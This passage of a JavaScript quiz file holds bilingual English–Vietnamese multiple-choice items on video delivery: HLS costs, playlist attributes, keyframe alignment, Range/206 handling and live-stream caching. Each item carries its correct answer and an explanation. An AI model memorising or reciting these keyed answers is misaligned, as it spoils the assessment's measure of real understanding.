              'Exactly one thing: mid-playback bitrate adaptation — which a 15-second clip will never perform. Measured cost on this ten-second sample: 2.3× the bytes, three encodes instead of one, and 19 objects instead of 1, plus a JavaScript player outside Safari. The object count matters because storage request charges are <em>per object</em>, and it grows with both duration and rung count — a 90-minute film at the same settings is thousands. Seeking, CDN caching and native controls all already work on a plain MP4 with <code>+faststart</code>.',
              'Đúng MỘT thứ: thích ứng bitrate GIỮA LÚC PHÁT — điều mà một clip 15 giây sẽ không bao giờ thực hiện. Chi phí đo được trên mẫu mười giây này: gấp 2,3 lần số byte, ba lượt encode thay vì một, và 19 object thay vì 1, cộng thêm một trình phát JavaScript ở ngoài Safari. Số object quan trọng vì phí request của kho lưu trữ tính THEO TỪNG OBJECT, và nó tăng theo cả thời lượng lẫn số bậc — một bộ phim 90 phút cùng thiết lập là hàng nghìn. Còn tua, cache CDN và bộ điều khiển gốc thì vốn đã chạy sẵn trên một MP4 thường có <code>+faststart</code>.',
            ),
          ],
          correct: 3,
          explanation: EX(
            'A plain MP4 with the index at the front already streams: the browser Range-fetches as playback advances, and a seek to 0:45 issues a Range request for the bytes covering 0:45 rather than downloading the prefix. That is why option 3 is wrong — it names a capability progressive delivery already has, which is exactly the misconception the lesson is built to remove. What HLS adds, and the only thing it adds, is switching renditions mid-playback when bandwidth changes. A 15-second feed clip never gets the chance. The measured costs are the argument against paying for it: 2.3× the bytes here, three encodes, 19 objects, and hls.js on every non-Safari browser. The object count deserves its own line because it is charged per object on write and per object on origin fetch, and it scales multiplicatively — segments per minute times rungs. Option 1 identifies a real tuning axis but misstates the benefit; startup latency on a 15-second clip is dominated by the first Range response either way. Option 2 ignores request pricing entirely, which is the cost that surprises people, and treats a JavaScript player dependency as a matter of taste.',
            'Một MP4 thường có chỉ mục nằm ở đầu thì vốn đã stream sẵn: trình duyệt lấy theo Range khi phát tới đâu, và một lần tua tới 0:45 phát ra một yêu cầu Range cho đúng phần byte bao mốc 0:45 chứ không tải phần đầu. Đó là lý do phương án 3 sai — nó nêu một khả năng mà phát progressive VỐN ĐÃ CÓ, và đúng đó là ngộ nhận mà bài học được dựng ra để xoá. Thứ HLS thêm vào, và là thứ duy nhất nó thêm vào, là chuyển đổi bản chất lượng giữa lúc phát khi băng thông đổi. Một clip feed 15 giây không bao giờ có cơ hội đó. Các chi phí đo được là lập luận chống lại việc trả tiền cho nó: gấp 2,3 lần số byte ở đây, ba lượt encode, 19 object, và hls.js trên mọi trình duyệt không phải Safari. Số object xứng đáng có một dòng riêng vì nó bị tính tiền theo từng object lúc ghi và theo từng object lúc origin bị hỏi tới, và nó tăng theo phép nhân — số segment mỗi phút nhân số bậc. Phương án 1 nhận ra một trục tinh chỉnh có thật nhưng nói sai lợi ích; độ trễ khởi động trên một clip 15 giây bị chi phối bởi phản hồi Range đầu tiên trong cả hai trường hợp. Phương án 2 phớt lờ hoàn toàn việc tính tiền theo request, vốn là khoản chi phí làm người ta bất ngờ, và coi việc phụ thuộc một trình phát JavaScript là chuyện sở thích.',
          ),
        }),

        // q41 · đáp án 2
        mcq({
          prompt: B(
            'This is the master playlist ffmpeg generated for the three-rendition ladder:' +
              code("#EXTM3U\n#EXT-X-VERSION:6\n#EXT-X-STREAM-INF:BANDWIDTH=625664,AVERAGE-BANDWIDTH=595583,RESOLUTION=640x360,CODECS=\"avc1.64001e,mp4a.40.2\"\n0/index.m3u8\n#EXT-X-STREAM-INF:BANDWIDTH=3235104,AVERAGE-BANDWIDTH=3097187,RESOLUTION=1280x720,CODECS=\"avc1.64001f,mp4a.40.2\"\n1/index.m3u8") +
              'What are <code>BANDWIDTH</code> and <code>CODECS</code> for, and why should you let ffmpeg write them?',
            'Đây là master playlist mà ffmpeg sinh ra cho bậc thang ba bản:' +
              code("#EXTM3U\n#EXT-X-VERSION:6\n#EXT-X-STREAM-INF:BANDWIDTH=625664,AVERAGE-BANDWIDTH=595583,RESOLUTION=640x360,CODECS=\"avc1.64001e,mp4a.40.2\"\n0/index.m3u8\n#EXT-X-STREAM-INF:BANDWIDTH=3235104,AVERAGE-BANDWIDTH=3097187,RESOLUTION=1280x720,CODECS=\"avc1.64001f,mp4a.40.2\"\n1/index.m3u8") +
              '<code>BANDWIDTH</code> và <code>CODECS</code> để làm gì, và vì sao nên để ffmpeg tự viết chúng?',
          ),
          options: [
            B(
              '<code>BANDWIDTH</code> is the storage size of the rendition in bytes and <code>CODECS</code> is advisory metadata for analytics; players ignore both and select a rendition by <code>RESOLUTION</code> compared against the viewport, which is why the two 1280x720 rows would be indistinguishable to a player.',
              '<code>BANDWIDTH</code> là dung lượng lưu trữ của bản đó tính bằng byte và <code>CODECS</code> là siêu dữ liệu tham khảo cho phân tích; trình phát bỏ qua cả hai và chọn bản theo <code>RESOLUTION</code> so với khung nhìn, đó là lý do hai dòng 1280x720 sẽ không phân biệt được với một trình phát.',
            ),
            B(
              'Both are hints the CDN uses to decide which rendition to prefetch; the player receives whatever the edge sends. Writing them by hand is safe because the values only affect prefetch efficiency, never correctness of playback.',
              'Cả hai là gợi ý để CDN quyết định nên nạp trước bản nào; trình phát nhận bất cứ thứ gì biên gửi tới. Viết tay chúng thì an toàn vì các giá trị chỉ ảnh hưởng tới hiệu quả nạp trước, không bao giờ tới tính đúng đắn của việc phát.',
            ),
            B(
              '<code>BANDWIDTH</code> is the rendition\'s <em>peak</em> bitrate in bits per second, including the audio track, and it is what the adaptation algorithm compares against measured throughput — understate it and players pick a rendition they cannot sustain, then rebuffer. <code>CODECS</code> is the RFC 6381 string (<code>avc1.64001e</code> = H.264 High profile, level 3.0) that lets a player decide it can decode the rendition at all, and skip it if not. Both are easy to get subtly wrong by hand and ffmpeg derives them from the streams it just wrote.',
              '<code>BANDWIDTH</code> là bitrate ĐỈNH của bản đó tính bằng bit mỗi giây, tính cả track âm thanh, và nó là thứ mà thuật toán thích ứng đem so với thông lượng đo được — khai thấp đi thì trình phát chọn một bản nó không kham nổi rồi phải đệm lại. <code>CODECS</code> là chuỗi theo RFC 6381 (<code>avc1.64001e</code> = H.264 profile High, level 3.0) giúp trình phát quyết định nó có giải mã nổi bản đó hay không, và bỏ qua nếu không. Cả hai đều rất dễ sai một cách tinh vi khi viết tay, còn ffmpeg thì suy chúng ra từ chính những luồng nó vừa ghi.',
            ),
            B(
              '<code>BANDWIDTH</code> is the average bitrate and <code>AVERAGE-BANDWIDTH</code> is the peak, which is why the first number is larger in both rows; players read the second and use the first only as a display label in quality menus.',
              '<code>BANDWIDTH</code> là bitrate trung bình còn <code>AVERAGE-BANDWIDTH</code> là đỉnh, đó là lý do con số thứ nhất lớn hơn ở cả hai dòng; trình phát đọc con số thứ hai và chỉ dùng con số thứ nhất làm nhãn hiển thị trong menu chất lượng.',
            ),
          ],
          correct: 2,
          explanation: EX(
            'The master playlist is a menu, and these two attributes are how a player reads it. <code>BANDWIDTH</code> is the peak bitrate the rendition can demand — the adaptation algorithm compares it against what it is actually measuring and picks the highest rung it believes it can sustain. Understate it and the player commits to a stream it cannot keep up with, drains its buffer and rebuffers, which is worse than having picked the lower rung honestly. It must include the audio track, because the player has to fetch both. <code>CODECS</code> is an RFC 6381 identifier: <code>avc1.64001e</code> decomposes into H.264, profile <code>64</code> (High), constraint flags <code>00</code>, level <code>1e</code> = 30 = level 3.0, and <code>mp4a.40.2</code> is AAC-LC. A player that cannot decode High profile skips that rendition entirely — but only if the string is right; get it wrong and the player either tries and fails or discards a rendition it could have played. Both are derived correctly by the muxer from the streams it just produced, so hand-writing them is unnecessary risk. Option 4 has the two bandwidth fields backwards, and the measurement disproves it: <code>BANDWIDTH</code> is 625,664 against <code>AVERAGE-BANDWIDTH</code> 595,583, so the first is the larger one, which is what "peak" means. Options 1 and 2 both demote the fields to decoration; they are the inputs to the only decision HLS exists to make.',
            'Master playlist là một cái thực đơn, và hai thuộc tính này là cách một trình phát đọc nó. <code>BANDWIDTH</code> là bitrate ĐỈNH mà bản đó có thể đòi hỏi — thuật toán thích ứng đem nó so với thứ nó đang đo được rồi chọn bậc cao nhất mà nó tin là kham nổi. Khai thấp đi thì trình phát cam kết với một luồng nó không theo kịp, rút cạn bộ đệm rồi phải đệm lại, tệ hơn là cứ thành thật chọn bậc thấp hơn. Nó phải TÍNH CẢ track âm thanh, vì trình phát phải lấy cả hai. <code>CODECS</code> là một định danh theo RFC 6381: <code>avc1.64001e</code> phân rã thành H.264, profile <code>64</code> (High), cờ ràng buộc <code>00</code>, level <code>1e</code> = 30 = level 3.0, còn <code>mp4a.40.2</code> là AAC-LC. Một trình phát không giải mã được profile High sẽ bỏ hẳn bản đó — nhưng chỉ khi chuỗi đúng; viết sai thì trình phát hoặc thử rồi hỏng, hoặc vứt đi một bản đáng lẽ nó phát được. Cả hai đều được muxer suy ra chính xác từ những luồng nó vừa sinh, nên viết tay là rước rủi ro không cần thiết. Phương án 4 lộn ngược hai trường bandwidth, và phép đo bác bỏ nó: <code>BANDWIDTH</code> là 625.664 còn <code>AVERAGE-BANDWIDTH</code> là 595.583, nên con số thứ nhất mới là con số lớn hơn, đúng nghĩa của chữ "đỉnh". Phương án 1 và 2 đều hạ hai trường này xuống hàng trang trí; chúng chính là đầu vào cho quyết định duy nhất mà HLS sinh ra để thực hiện.',
          ),
        }),

        // q42 · đáp án 1
        mcq({
          prompt: B(
            'The same clip was encoded twice and its key frames listed:' +
              code("pinned (-g 60 -keyint_min 60 -sc_threshold 0)\n  → keyframe tại: 0.000000  2.000000  4.000000  6.000000  8.000000\n\nfree (encoder chọn)\n  → keyframe tại: 0.000000  8.333333") +
              'Why does the second one break a bitrate ladder, and why does it never break in testing?',
            'Cùng một clip được encode hai lần và các frame khoá được liệt kê:' +
              code("pinned (-g 60 -keyint_min 60 -sc_threshold 0)\n  → keyframe tại: 0.000000  2.000000  4.000000  6.000000  8.000000\n\nfree (bộ encode tự chọn)\n  → keyframe tại: 0.000000  8.333333") +
              'Vì sao bản thứ hai làm hỏng một bậc thang bitrate, và vì sao nó không bao giờ hỏng lúc kiểm thử?',
          ),
          options: [
            B(
              'Because the second encode has too few key frames for the segmenter to cut at all, so ffmpeg emits one enormous segment per rendition; it does not appear in testing because a single-segment stream still plays correctly from the start on any player.',
              'Vì bản encode thứ hai có quá ít frame khoá để bộ cắt segment có chỗ mà cắt, nên ffmpeg phát ra một segment khổng lồ cho mỗi bản; nó không hiện ra khi kiểm thử vì một luồng một-segment vẫn phát đúng từ đầu trên mọi trình phát.',
            ),
            B(
              'A player can only switch renditions at a segment boundary, and a segment must begin with a key frame. With keyframe positions left to the encoder, each rendition lands them wherever its own scene analysis suggests, so boundaries drift apart and a switch arrives mid-GOP with no reference frame — visible corruption until the next key frame. It never shows in testing because a fast connection never triggers a rendition switch at all.',
              'Một trình phát chỉ chuyển bản được ở RANH GIỚI SEGMENT, và một segment thì phải bắt đầu bằng một frame khoá. Khi để bộ encode tự chọn vị trí frame khoá, mỗi bản đặt chúng ở nơi mà phân tích cảnh của riêng nó gợi ý, nên các ranh giới trôi lệch nhau và một lần chuyển rơi vào giữa GOP mà không có frame tham chiếu — hỏng hình nhìn thấy được cho tới frame khoá kế tiếp. Nó không bao giờ hiện ra lúc kiểm thử vì một đường truyền nhanh chẳng bao giờ kích hoạt một lần chuyển bản nào.',
            ),
            B(
              'Because <code>-sc_threshold 0</code> disables scene-change detection, the pinned version is the broken one: it places key frames on a fixed grid regardless of content, so a cut that falls mid-GOP is encoded as motion and the ladder wastes bits. Testing hides it because synthetic clips have no scene cuts.',
              'Vì <code>-sc_threshold 0</code> tắt phát hiện đổi cảnh, chính bản pinned mới là bản hỏng: nó đặt frame khoá trên một lưới cố định bất kể nội dung, nên một cú cắt cảnh rơi vào giữa GOP bị encode như chuyển động và bậc thang phí bit. Kiểm thử che giấu điều đó vì các clip tổng hợp không có cú cắt cảnh nào.',
            ),
            B(
              'Because the two encodes have different frame counts between key frames, the segment durations differ between renditions, so the <code>#EXTINF</code> values disagree and players reject the master playlist as malformed. It passes testing because a single-rendition stream has nothing to disagree with.',
              'Vì hai bản encode có số frame giữa các frame khoá khác nhau, thời lượng segment khác nhau giữa các bản, nên các giá trị <code>#EXTINF</code> bất đồng và trình phát từ chối master playlist vì cho là sai định dạng. Nó qua được kiểm thử vì một luồng một-bản thì chẳng có gì để bất đồng.',
            ),
          ],
          correct: 1,
          explanation: EX(
            'The measurement isolates the mechanism cleanly: pinning gives key frames at exactly 0, 2, 4, 6 and 8 seconds — <code>-g 60</code> at 30 fps is one every two seconds, matching <code>-hls_time 2</code> — while the free encode produced two in the whole clip, at 0 and 8.33. Now imagine three renditions each doing that independently: their segment boundaries no longer line up, so segment 7 of the 720p stream and segment 7 of the 360p stream cover different time ranges and neither necessarily starts on a key frame. A switch then hands the decoder a frame whose reference frames it does not have, and the picture breaks until the next key frame arrives. The reason this is a notorious bug is the second half: rendition switching only happens when bandwidth changes enough to trigger it, and you test on an office connection where it never does. It reproduces on a train. <code>-sc_threshold 0</code> is the third flag and the one people leave out — without it the encoder still inserts extra key frames at scene changes, which reintroduces the drift even when <code>-g</code> is pinned. Option 1 misreads the segmenter, which cuts at the nearest key frame and would produce uneven segments rather than one. Option 3 inverts the roles: giving up scene-change key frames costs a little efficiency and buys alignment, which is the trade you want here. Option 4 invents a validation; players tolerate varying <code>#EXTINF</code> values, and the last segment of any stream is usually short.',
            'Phép đo cô lập cơ chế rất sạch: bản ghim cho frame khoá đúng ở giây 0, 2, 4, 6 và 8 — <code>-g 60</code> ở 30 fps là cứ hai giây một cái, khớp với <code>-hls_time 2</code> — còn bản để tự do thì sinh ra đúng hai cái trong cả clip, ở 0 và 8,33. Giờ hãy hình dung ba bản mỗi bản làm việc đó một cách độc lập: ranh giới segment của chúng không còn thẳng hàng, nên segment số 7 của luồng 720p và segment số 7 của luồng 360p bao hai khoảng thời gian khác nhau và chẳng cái nào nhất thiết bắt đầu bằng một frame khoá. Một lần chuyển khi đó đưa cho bộ giải mã một frame mà nó không có các frame tham chiếu, và hình vỡ cho tới khi frame khoá kế tiếp tới. Lý do đây là một bug khét tiếng nằm ở nửa sau: việc chuyển bản chỉ xảy ra khi băng thông đổi đủ nhiều để kích hoạt nó, mà bạn thì kiểm thử trên đường truyền văn phòng nơi điều đó không bao giờ xảy ra. Nó tái hiện trên tàu điện. <code>-sc_threshold 0</code> là cái cờ thứ ba và là cái người ta hay bỏ sót — không có nó, bộ encode vẫn chèn thêm frame khoá ở những chỗ đổi cảnh, và điều đó tái lập lại sự trôi lệch ngay cả khi <code>-g</code> đã được ghim. Phương án 1 hiểu sai bộ cắt segment, vốn cắt ở frame khoá gần nhất và sẽ sinh ra các segment dài ngắn không đều chứ không phải một cái. Phương án 3 đảo ngược vai trò: từ bỏ frame khoá theo đổi cảnh tốn một chút hiệu quả và mua về sự thẳng hàng, và đó đúng là đánh đổi bạn muốn ở đây. Phương án 4 bịa ra một phép kiểm; trình phát chấp nhận các giá trị <code>#EXTINF</code> khác nhau, và segment cuối của mọi luồng thường ngắn hơn.',
          ),
        }),

        // q43 · đáp án 3
        mcq({
          prompt: B(
            'A custom Express route serves video for a private-file feature. Playback starts fine, but seeking makes the browser re-download from the beginning and buffer for tens of seconds. The network tab shows <code>200</code> where you expected something else. What is missing?',
            'Một route Express tự viết phục vụ video cho tính năng file riêng tư. Việc phát bắt đầu thì ổn, nhưng tua thì làm trình duyệt tải lại từ đầu và đệm hàng chục giây. Tab network hiện <code>200</code> ở chỗ bạn mong đợi một thứ khác. Thiếu cái gì?',
          ),
          options: [
            B(
              'The <code>Content-Length</code> header. Without it the browser cannot compute a byte offset for the seek target, so it restarts the transfer; adding it lets the existing <code>200</code> response be resumed in place. Every other header on the route as written is already correct.',
              'Header <code>Content-Length</code>. Không có nó thì trình duyệt không tính được offset byte cho đích tua, nên nó khởi động lại lượt truyền; thêm nó vào là cho phép chính phản hồi <code>200</code> hiện có được tiếp tục tại chỗ. Mọi header khác trên route như đã viết thì vốn đã đúng.',
            ),
            B(
              'The <code>+faststart</code> flag on the file. The route is fine; the browser is re-reading from zero because the <code>moov</code> index is at the tail, and remuxing the source is the whole fix. The route\'s status codes are irrelevant once the index is at the front of the file.',
              'Cờ <code>+faststart</code> trên file. Route thì ổn; trình duyệt đọc lại từ số không vì chỉ mục <code>moov</code> nằm ở đuôi, và remux lại nguồn là toàn bộ cách vá. Mã trạng thái của route không liên quan một khi chỉ mục đã nằm ở đầu file.',
            ),
            B(
              'A <code>Cache-Control: immutable</code> header. Without it the browser revalidates on every seek and discards its buffer, which presents as a full re-download; object storage sets this automatically on every object, which is why the problem is specific to hand-rolled routes.',
              'Một header <code>Cache-Control: immutable</code>. Không có nó thì trình duyệt kiểm tra lại ở mỗi lần tua và vứt bộ đệm đi, hiện ra như một lượt tải lại toàn bộ; kho object đặt sẵn header này cho mọi object, và đó là lý do vấn đề chỉ có ở các route tự viết.',
            ),
            B(
              'Range support. The route must advertise <code>Accept-Ranges: bytes</code>, and when a request carries a <code>Range</code> header it must answer <b>206 Partial Content</b> with a matching <code>Content-Range: bytes start-end/size</code> and stream only that slice. Returning <code>200</code> with a partial body makes the browser believe it received the whole file, so playback breaks in ways that look like corruption. Object storage does this natively; a hand-written route does not unless you write it.',
              'Hỗ trợ Range. Route phải quảng bá <code>Accept-Ranges: bytes</code>, và khi một yêu cầu mang header <code>Range</code> thì nó phải trả lời <b>206 Partial Content</b> kèm một <code>Content-Range: bytes start-end/size</code> khớp và chỉ chảy đúng lát cắt đó. Trả về <code>200</code> kèm một phần thân dở dang khiến trình duyệt tin rằng nó đã nhận cả file, nên việc phát vỡ theo kiểu trông như file hỏng. Kho object làm việc này sẵn; một route viết tay thì không, trừ khi bạn tự viết.',
            ),
          ],
          correct: 3,
          explanation: EX(
            'Seeking in a browser is implemented as an HTTP Range request, and the server has to hold up its end of that protocol in two places. First it must advertise the capability with <code>Accept-Ranges: bytes</code>, or the client will not try. Second, when a request arrives carrying <code>Range: bytes=…</code>, the response must be <code>206</code> with a <code>Content-Range</code> naming the slice and the total size, and the body must be exactly that slice. The status code is the part that gets skipped, and it is the one that causes the confusing symptom: a <code>200</code> means "here is the entire representation", so a browser that receives a partial body under a <code>200</code> concludes the file is that short or that it is malformed, and the failure looks like corruption rather than like a missing feature. This is one of the things you get for free from object storage and lose the moment you put a private-file route in front of it. Option 1 is necessary but not sufficient — the previous question\'s progressive playback already had a length and still needs Range for seeking. Option 2 describes a real and adjacent bug (Chapter 3), but it produces a slow <em>start</em>, not a seek that re-downloads, and the network tab would not show the tell-tale <code>200</code>. Option 3 confuses caching with partial transfer; an immutable header helps repeat visits and does nothing for a seek within one playback.',
            'Việc tua trong trình duyệt được cài đặt bằng một yêu cầu HTTP Range, và máy chủ phải giữ đúng phần của nó trong giao thức đó ở hai chỗ. Thứ nhất, nó phải quảng bá khả năng đó bằng <code>Accept-Ranges: bytes</code>, không thì client sẽ không thử. Thứ hai, khi một yêu cầu tới mang <code>Range: bytes=…</code>, phản hồi phải là <code>206</code> kèm một <code>Content-Range</code> nêu rõ lát cắt và kích thước tổng, và phần thân phải đúng là lát cắt đó. Mã trạng thái là phần hay bị bỏ qua, và nó chính là thứ gây ra cái triệu chứng gây bối rối: <code>200</code> nghĩa là "đây là toàn bộ biểu diễn", nên một trình duyệt nhận được phần thân dở dang dưới mã <code>200</code> sẽ kết luận rằng file ngắn như vậy hoặc file bị hỏng, và kiểu hỏng đó trông như file lỗi chứ không như một tính năng còn thiếu. Đây là một trong những thứ bạn được miễn phí từ kho object và mất ngay khi đặt một route file-riêng-tư ra phía trước nó. Phương án 1 là cần nhưng không đủ — việc phát progressive ở câu trước vốn đã có độ dài mà vẫn cần Range để tua được. Phương án 2 mô tả một bug có thật và ở ngay cạnh (Chương 3), nhưng nó gây KHỞI ĐỘNG chậm chứ không gây tua-thì-tải-lại, và tab network sẽ không hiện cái mã <code>200</code> tố cáo kia. Phương án 3 lẫn việc cache với việc truyền từng phần; một header immutable giúp cho những lần ghé lại và chẳng làm gì cho một lần tua trong cùng một lượt phát.',
          ),
        }),

        /* ── Chương 8 — media trực tiếp (3 câu) ───────────────────────────── */

        // q44 · đáp án 0
        mcq({
          prompt: B(
            'A product team says "we need live video". Which question decides the architecture, and what does each answer commit you to?',
            'Một nhóm sản phẩm nói "bọn mình cần video trực tiếp". Câu hỏi nào quyết định kiến trúc, và mỗi câu trả lời buộc bạn vào cái gì?',
          ),
          options: [
            B(
              'Do participants converse with each other? If two or more people must talk, only WebRTC works — above roughly 500 ms speakers start talking over each other — and that commits you to a stateful SFU whose cost scales per participant and which cannot ride a CDN. If the audience is watching rather than talking, you are in HLS territory: 15-45 s of ordinary segments on a CDN with no media server at all, or 2-6 s of low-latency HLS when a synchronous side channel like chat would otherwise spoil the stream.',
              'Người tham gia có ĐỐI THOẠI với nhau không? Nếu hai người trở lên phải nói chuyện thì chỉ WebRTC chạy được — trên khoảng 500 ms là người nói bắt đầu chồng tiếng lên nhau — và điều đó buộc bạn vào một SFU có trạng thái với chi phí tăng theo từng người tham gia và không cưỡi được CDN. Nếu khán giả đang XEM chứ không nói, bạn ở địa hạt HLS: 15-45 giây với các segment thường trên CDN, hoàn toàn không cần máy chủ media nào, hoặc 2-6 giây với HLS độ trễ thấp khi một kênh phụ đồng bộ như chat sẽ làm hỏng luồng.',
            ),
            B(
              'How many concurrent viewers? Below a few thousand, WebRTC is simpler because there is no segmenting, no manifest and no CDN configuration; above that, the per-participant cost forces you onto HLS, so the number of viewers is the single variable that selects the tier.',
              'Bao nhiêu người xem đồng thời? Dưới vài nghìn thì WebRTC đơn giản hơn vì không phải cắt segment, không manifest, không cấu hình CDN; trên mức đó thì chi phí theo từng người buộc bạn sang HLS, nên số người xem là biến duy nhất chọn ra bậc.',
            ),
            B(
              'What is the source resolution? WebRTC is capped at 720p by its congestion control, so anything above that must be HLS regardless of latency requirements, and the latency tiers follow from the resolution decision rather than the other way round.',
              'Độ phân giải nguồn là bao nhiêu? WebRTC bị chặn ở 720p bởi cơ chế điều khiển tắc nghẽn của nó, nên bất cứ thứ gì cao hơn đều phải dùng HLS bất kể yêu cầu độ trễ, và các bậc độ trễ suy ra từ quyết định độ phân giải chứ không phải ngược lại.',
            ),
            B(
              'Is the stream recorded for later playback? If yes you must segment anyway, so HLS is free and the live path should reuse it; if no, WebRTC avoids writing anything to disk. Recording, not latency, is what makes the two architectures incompatible.',
              'Luồng có được ghi lại để phát về sau không? Nếu có thì đằng nào bạn cũng phải cắt segment, nên HLS là miễn phí và đường live nên dùng lại nó; nếu không thì WebRTC tránh được việc ghi bất cứ gì xuống đĩa. Chính việc GHI LẠI, chứ không phải độ trễ, mới là thứ làm hai kiến trúc không tương thích.',
            ),
          ],
          correct: 0,
          explanation: EX(
            '"Live" names three unrelated systems, and choosing a technology before choosing a latency is how teams end up rebuilding. Tier 1 is 15-45 seconds: ordinary HLS segments on a CDN, no media server, unlimited scale at flat cost. Tier 2 is 2-6 seconds: low-latency HLS with partial segments, an origin that can serve them, still CDN-friendly. Tier 3 is 100-500 ms: WebRTC through a selective forwarding unit, which is a stateful media server whose cost scales with participants and which cannot be cached. There is no smooth path between them — tier 1 to 2 is a re-encode and an origin change, tier 2 to 3 is a rewrite. The question that separates them is whether people converse, because conversation is the only requirement that genuinely needs sub-second latency; everything else is watching, and watching is cheap. The second question is the one that catches people: a chat or a bidding widget alongside a 25-second stream means the side channel spoils the video, which pushes you to tier 2 not because the video needs it but because the <em>combination</em> does. Option 2 has the scaling backwards — WebRTC is the tier that struggles with audience size, not the one that suits it. Option 3 invents a resolution cap. Option 4 identifies a real requirement that is orthogonal: any tier can be recorded.',
            'Chữ "trực tiếp" gọi tên ba hệ thống không liên quan, và chọn công nghệ trước khi chọn độ trễ là cách các nhóm đi tới chỗ phải làm lại từ đầu. Bậc 1 là 15-45 giây: các segment HLS thường trên CDN, không máy chủ media, co giãn vô hạn với chi phí phẳng. Bậc 2 là 2-6 giây: HLS độ trễ thấp với các segment từng phần, một origin phục vụ được chúng, vẫn thân thiện với CDN. Bậc 3 là 100-500 ms: WebRTC qua một selective forwarding unit, tức một máy chủ media có trạng thái với chi phí tăng theo số người tham gia và không cache được. Không có đường trơn tru nào giữa chúng — bậc 1 sang 2 là một lượt encode lại và đổi origin, bậc 2 sang 3 là viết lại. Câu hỏi tách chúng ra là liệu người ta có ĐỐI THOẠI không, vì đối thoại là yêu cầu duy nhất thật sự cần độ trễ dưới một giây; mọi thứ còn lại là xem, và xem thì rẻ. Câu hỏi thứ hai mới là cái bẫy người: một khung chat hay một widget đấu giá đặt cạnh một luồng trễ 25 giây nghĩa là kênh phụ làm lộ trước nội dung, và điều đó đẩy bạn sang bậc 2 không phải vì VIDEO cần, mà vì SỰ KẾT HỢP cần. Phương án 2 lộn ngược chuyện co giãn — WebRTC mới là bậc chật vật với quy mô khán giả, không phải bậc hợp với nó. Phương án 3 bịa ra một trần độ phân giải. Phương án 4 nêu một yêu cầu có thật nhưng vuông góc: bậc nào cũng ghi lại được.',
          ),
        }),

        // q45 · đáp án 3
        mcq({
          prompt: B(
            'A live HLS stream plays for about twelve seconds for every viewer and then stops. The origin reports no errors, CPU is normal, and the encoder is still writing segments to disk. What is the most likely cause?',
            'Một luồng HLS trực tiếp phát được khoảng mười hai giây với mọi người xem rồi dừng. Origin không báo lỗi nào, CPU bình thường, và bộ encode vẫn đang ghi segment xuống đĩa. Nguyên nhân khả dĩ nhất là gì?',
          ),
          options: [
            B(
              'The encoder lost its input and is writing zero-length segments; the origin reports no error because writing an empty file succeeds, and viewers stop at the last segment that had content. The twelve seconds is simply however much material arrived before the source dropped out.',
              'Bộ encode mất đầu vào và đang ghi ra các segment rỗng; origin không báo lỗi vì ghi một file rỗng vẫn thành công, và người xem dừng lại ở segment cuối cùng còn có nội dung. Mười hai giây chỉ đơn giản là lượng chất liệu kịp tới trước khi nguồn rớt.',
            ),
            B(
              '<code>-hls_list_size</code> is too small, so segments scroll out of the playlist faster than players can fetch them; twelve seconds is six two-second segments, which is exactly one window, and that arithmetic is what points at the flag rather than at the cache.',
              '<code>-hls_list_size</code> đặt quá nhỏ, nên segment trượt khỏi playlist nhanh hơn tốc độ trình phát lấy về; mười hai giây là sáu segment hai giây, đúng bằng một cửa sổ, và chính phép tính đó chỉ vào cái cờ chứ không chỉ vào cache.',
            ),
            B(
              '<code>delete_segments</code> is removing files while viewers are still fetching them, so requests for scrolled-out segments 404 and playback stops at the oldest one still on disk. The access log would show a burst of 404s beginning at the same moment for everyone.',
              '<code>delete_segments</code> đang xoá file trong lúc người xem vẫn đang lấy về, nên các yêu cầu cho segment đã trượt ra trả về 404 và việc phát dừng ở cái cũ nhất còn trên đĩa. Log truy cập sẽ hiện một đợt 404 bắt đầu đúng cùng một thời điểm với mọi người.',
            ),
            B(
              'The manifest was served with the VOD cache headers — <code>max-age=31536000, immutable</code> — so the CDN pinned the playlist at stream start and every viewer keeps seeing the same handful of segments forever. The origin looks perfectly healthy <em>because</em> the CDN stopped asking it for anything. Live manifests need a <code>max-age</code> matching one segment; verify by curling the manifest twice ten seconds apart and diffing — identical output means the cache is wrong.',
              'Manifest được phục vụ với header cache của VOD — <code>max-age=31536000, immutable</code> — nên CDN đã ghim playlist ngay lúc luồng bắt đầu và mọi người xem cứ thấy mãi đúng dăm ba segment đó. Origin trông hoàn toàn khoẻ mạnh CHÍNH VÌ CDN thôi hỏi nó bất cứ thứ gì. Manifest trực tiếp cần một <code>max-age</code> bằng một segment; hãy xác minh bằng cách curl cái manifest hai lần cách nhau mười giây rồi diff — output giống hệt nhau nghĩa là cache sai.',
            ),
          ],
          correct: 3,
          explanation: EX(
            'Segments and manifests have opposite caching requirements, and copying the VOD configuration is how they get confused. A segment is immutable — <code>seg-00042.ts</code> never changes once written — so a year-long <code>immutable</code> cache is exactly right. A live manifest is the opposite: it gains an entry every couple of seconds and drops one off the front, so it is the most volatile object in the system. Pin it and the CDN serves the version captured at stream start to every viewer forever; they play the segments it lists, run out, and stop. The detail that makes this hard to diagnose is stated in the answer: the origin has never looked healthier, because a pinned manifest means the CDN stops asking it anything, so request rates fall and error rates stay at zero. The check is deliberately crude and takes ten seconds — fetch the manifest twice with a gap and diff them; a live playlist that has not changed is a broken one. The three distractors are all real live-streaming failures and each produces a different signature: a dead input shows up as segments of a few hundred bytes, an undersized window produces stalls and jumps rather than a clean stop at the same point for everyone, and premature deletion produces 404s in the access log. The defining feature of the cache case is that it leaves no trace anywhere on the server.',
            'Segment và manifest có yêu cầu cache NGƯỢC NHAU, và chép cấu hình VOD sang là cách người ta lẫn hai thứ. Một segment là bất biến — <code>seg-00042.ts</code> không bao giờ đổi một khi đã ghi — nên một cache <code>immutable</code> dài một năm là hoàn toàn đúng. Một manifest trực tiếp thì ngược lại: nó thêm một mục sau mỗi vài giây và bỏ một mục ở đầu, nên nó là object hay thay đổi nhất trong cả hệ thống. Ghim nó lại thì CDN phục vụ cho mọi người xem cái bản chụp lúc luồng bắt đầu, mãi mãi; họ phát hết những segment nó liệt kê, hết bài, rồi dừng. Chi tiết làm việc chẩn đoán khó nằm ngay trong câu trả lời: origin chưa bao giờ trông khoẻ hơn, vì một manifest bị ghim nghĩa là CDN thôi hỏi nó bất cứ thứ gì, nên tốc độ request giảm và tỉ lệ lỗi đứng ở không. Phép kiểm cố ý thô sơ và tốn mười giây — lấy manifest hai lần cách quãng rồi diff; một playlist trực tiếp mà không đổi là một playlist hỏng. Ba phương án nhiễu đều là những kiểu hỏng có thật của phát trực tiếp và mỗi cái để lại một chữ ký khác nhau: đầu vào chết thì hiện ra thành các segment chỉ vài trăm byte, một cửa sổ quá nhỏ thì gây khựng và nhảy chứ không dừng gọn ở cùng một chỗ với mọi người, còn 